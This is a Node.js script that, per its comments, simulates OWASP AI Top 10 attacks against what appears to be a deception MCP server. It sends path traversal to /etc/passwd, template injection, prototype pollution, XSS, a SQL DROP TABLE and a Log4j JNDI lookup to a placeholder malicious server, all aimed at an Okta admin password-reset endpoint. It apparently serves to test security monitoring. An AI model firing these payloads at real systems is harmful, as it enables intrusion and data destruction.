// OWASP AI Security Attack Simulation
// This script simulates attacks targeting AI vulnerabilities based on the OWASP AI Security Top 10

const fetch = require('node-fetch');

// Configuration
const BASE_URL = 'https://deception-remote-mcp-server.harshad-surfer.workers.dev';
const AI_AGENT_ID = 'owasp-ai-attack-' + Math.random().toString(36).substring(2, 8);
const AI_USER_AGENT = 'AI-SecurityTest/1.0 (OWASP-AI-Top10; Research)';

console.log('\x1b[31m%s\x1b[0m', '=== OWASP AI Security Attack Simulation ===');
console.log('\x1b[33m%s\x1b[0m', 'Targeting specific AI vulnerabilities based on OWASP AI Security Top 10\n');

// Function to make requests with variable delay
async function makeRequest(endpoint, params, description, attackType) {
  const delay = Math.floor(Math.random() * 1000) + 500;
  await new Promise(resolve => setTimeout(resolve, delay));
  
  console.log(`\n\x1b[36m%s\x1b[0m`, `[${attackType}] ${description}`);
  
  try {
    const response = await fetch(`${BASE_URL}${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': AI_USER_AGENT,
        'X-Client-ID': AI_AGENT_ID,
        'Accept': 'application/json'
      },
      body: JSON.stringify(params)
    });
    
    const text = await response.text();
    let data;
    
    try {
      data = JSON.parse(text);
      console.log('\x1b[32m%s\x1b[0m', '[Response]');
      console.log(JSON.stringify(data, null, 2));
      return data;
    } catch (e) {
      console.log('\x1b[32m%s\x1b[0m', '[Response]');
      console.log(text);
      return text;
    }
    
  } catch (error) {
    console.error('\x1b[31m%s\x1b[0m', `[Error] Request failed:`, error);
    return null;
  }
}

// Run the OWASP AI Security attack simulation
async function runOWASPAIAttacks() {
  // LLM08: Supply Chain/Dependency Attacks
  console.log('\x1b[33m%s\x1b[0m', '\n[OWASP LLM08] Testing for Supply Chain vulnerabilities...');
  
  // Attempt to exploit potential vulnerabilities in dependencies
  const supplyChainAttacks = [
    // Attempt to trigger path traversal
    { okta_username: "../../../etc/passwd" },
    // Attempt to exploit template injection
    { okta_username: "{{7*7}}" },
    // Attempt to exploit serialization issues
    { okta_username: {"__proto__": {"toString": "function() { return 'hacked'; }"}} }
  ];
  
  for (const attack of supplyChainAttacks) {
    await makeRequest('/okta_admin_password_reset', attack, `Supply chain/dependency attack: ${JSON.stringify(attack)}`, "LLM08-SUPPLY-CHAIN");
  }

  // LLM09: Insecure Output Handling
  console.log('\x1b[33m%s\x1b[0m', '\n[OWASP LLM09] Testing for Insecure Output Handling...');
  
  const outputHandlingAttacks = [
    // XSS injection attempt
    { okta_username: "<img src=x onerror=alert('XSS')>" },
    // SQL injection attempt
    { okta_username: "'; DROP TABLE users; --" },
    // Log4j/JNDI injection attempt
    { okta_username: "${jndi:ldap://malicious-server/payload}" }
  ];
  
  for (const attack of outputHandlingAttacks) {
    await makeRequest('/okta_admin_password_reset', attack, `Insecure output handling attack: ${JSON.stringify(attack)}`, "LLM09-OUTPUT-HANDLING");
  }

  console.log('\n\x1b[31m%s\x1b[0m', '[OWASP AI Security] Attack simulation completed');
  console.log('\x1b[33m%s\x1b[0m', 'This simulation tested for vulnerabilities in the OWASP AI Security Top 10 framework:');
  console.log('\x1b[33m%s\x1b[0m', '- LLM08: Supply Chain Vulnerabilities');
  console.log('\x1b[33m%s\x1b[0m', '- LLM09: Insecure Output Handling');
  console.log('\x1b[33m%s\x1b[0m', 'Check your security monitoring systems for alerts triggered by these attacks');
}

// Execute the OWASP AI Security attack sequence
runOWASPAIAttacks();
